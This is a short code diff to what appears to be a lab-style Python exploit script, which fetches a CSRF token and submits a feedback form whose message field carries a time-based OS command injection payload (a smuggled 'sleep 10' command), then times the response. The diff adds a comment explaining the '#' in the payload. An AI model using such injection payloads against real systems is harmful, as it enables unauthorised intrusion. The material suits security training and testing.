@@ -15,9 +15,8 @@ def run(url):
     session = requests.session()
     csrf = get_csrf(url, session)
     path = 'feedback/submit'
-    payload = '" & sleep 10 #"'
+    payload = '" & sleep 10 #"' # The "#" symbol in the payload is used for commenting the rest of the pre-typed command.
     data = { "csrf":csrf, 'name':'A', 'email':'AAA@gmail.com', 'subject':'A', 'message':"A" + payload}
-
     respond = session.post(url + path, data=data, verify=False, proxies=proxies)
     
     # Checks the total time took to respond
